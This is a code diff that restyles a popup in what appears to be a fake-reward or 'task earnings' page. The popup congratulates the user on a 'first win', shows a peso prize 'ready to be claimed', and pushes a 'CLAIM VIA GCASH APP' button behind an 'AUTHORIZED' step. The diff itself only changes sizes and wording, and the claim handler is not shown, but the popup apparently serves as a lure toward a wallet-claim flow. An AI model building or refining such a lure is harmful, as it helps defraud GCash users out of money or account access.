@@ -403,69 +403,76 @@ function hideFirewallPopup() {
     
     // ========== PHASE 2: WITHDRAWAL LINK ==========
     function showPhase2() {
-        const popupInner = document.querySelector('.popup-inner');
-        if (!popupInner) return;
-        
-        currentPhase = 2;
-        
-        popupInner.innerHTML = `
-            <div class="popup-close" id="popupClosePhase2">✕</div>
-            
-            <div style="text-align: center; margin-bottom: 10px;">
-                <div style="font-size: 60px; animation: bounceIn 0.5s ease;">🏆</div>
-            </div>
-            
-            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
-                GREAT JOB ON YOUR FIRST WIN!
-            </h2>
-            
-            <div class="divider" style="width: 40px; margin: 10px auto;"></div>
-            
-            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
-                <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
-                    "Nice work today! You made that look easy — you can definitely earn even more."
-                </p>
-                <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
-                    Your task rewards of 
-                    <span style="font-size: 28px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.5); display: inline-block; margin: 0 5px;">₱${currentBalance.toFixed(2)}</span> 
-                    are officially ready to be claimed!
-                </p>
-            </div>
-            
-            <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 50px; padding: 12px 20px; margin: 15px 0; text-align: center;">
-                <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; margin: 0;">
-                    Once your claiming process is 
-                    <span style="font-family: 'Orbitron', monospace; font-size: 16px; font-weight: 900; color: #00aaff; text-shadow: 0 0 8px rgba(0,170,255,0.5); display: inline-block; letter-spacing: 2px;">AUTHORIZED</span>, 
-                    your prize will be transferred instantly to your GCash wallet.
-                </p>
-            </div>
-            
-            <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 2px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; text-align: center; box-shadow: 0 0 20px rgba(255,215,0,0.2);">
-                <div style="font-size: 10px; color: #ffd700; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px;">PRIZE AMOUNT</div>
-                <div style="font-size: 56px; font-weight: 900; color: #ffd700; text-shadow: 0 0 15px rgba(255,215,0,0.4); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
-                <div style="height: 2px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 80%; margin: 10px auto;"></div>
-                <div style="font-size: 10px; color: #888;">Ready for payout</div>
-            </div>
-            
-            <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
-                <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
-                    💡 Make sure you have a verified GCash account to receive your reward
-                </p>
-            </div>
-            
-            <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%;">
-                <img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP
-            </button>
-
-            <div class="button-separator" style="margin: 15px 0 10px;"></div>
-
-            <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%;">
-                ← BACK TO PHASE 1
-            </button>
-        `;
-        
-        attachPhase2Events(popupInner);
+    const popupInner = document.querySelector('.popup-inner');
+    if (!popupInner) return;
+    
+    currentPhase = 2;
+    
+    // Adjust popup container size
+    const popupContainer = document.querySelector('.popup-container');
+    if (popupContainer) {
+        popupContainer.style.maxWidth = '320px';  // From 360px to 320px
+        popupContainer.style.width = '85%';       // From 90% to 85%
     }
+    
+    popupInner.innerHTML = `
+        <div class="popup-close" id="popupClosePhase2">✕</div>
+        
+        <div style="text-align: center; margin-bottom: 5px;">
+            <div style="font-size: 45px; animation: bounceIn 0.5s ease;">🏆</div>
+        </div>
+        
+        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 3px 0; letter-spacing: 1px;">
+            GREAT JOB!
+        </h2>
+        
+        <div class="divider" style="width: 30px; margin: 8px auto;"></div>
+        
+        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 12px; padding: 10px; margin: 8px 0;">
+            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #e0e0e0; line-height: 1.4; text-align: center; margin: 0;">
+                "Nice work today! You made that look easy!"
+            </p>
+            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ffd700; line-height: 1.4; text-align: center; margin: 5px 0 0 0;">
+                Your task rewards of 
+                <span style="font-size: 20px; font-weight: 900; color: #ffd700; text-shadow: 0 0 8px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</span> 
+                are ready to be claimed!
+            </p>
+        </div>
+        
+        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 40px; padding: 8px 15px; margin: 10px 0; text-align: center;">
+            <p style="font-family: 'Inter', sans-serif; font-size: 10px; color: #ccc; margin: 0;">
+                Once 
+                <span style="font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 900; color: #00aaff; text-shadow: 0 0 5px rgba(0,170,255,0.5);">AUTHORIZED</span>, 
+                prize transferred to GCash
+            </p>
+        </div>
+        
+        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 1px solid #ffd700; border-radius: 16px; padding: 10px; margin: 10px 0; text-align: center;">
+            <div style="font-size: 9px; color: #ffd700; text-transform: uppercase; letter-spacing: 2px;">PRIZE AMOUNT</div>
+            <div style="font-size: 36px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.3); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
+            <div style="height: 1px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 60%; margin: 5px auto;"></div>
+            <div style="font-size: 9px; color: #888;">Ready for payout</div>
+        </div>
+        
+        <div style="background: rgba(255,215,0,0.05); border-left: 2px solid #ffd700; border-radius: 6px; padding: 6px 10px; margin: 8px 0;">
+            <p style="margin: 0; font-size: 9px; color: #ffd700; text-align: center;">
+                💡 Must have verified GCash account
+            </p>
+        </div>
+        
+        <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%; padding: 12px; font-size: 14px; margin-top: 8px;">
+            <img src="images/gc_icon.png" class="gc-icon" style="width: 18px; height: 18px;"> CLAIM VIA GCASH APP
+        </button>
+
+        <div class="button-separator" style="margin: 10px 0 8px;"></div>
+
+        <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%; padding: 8px; font-size: 12px;">
+            ← BACK TO PHASE 1
+        </button>
+    `;
+    
+    attachPhase2Events(popupInner);
+}
     
     // ========== ATTACH PHASE 2 EVENTS ==========
     function attachPhase2Events(popupInner) {
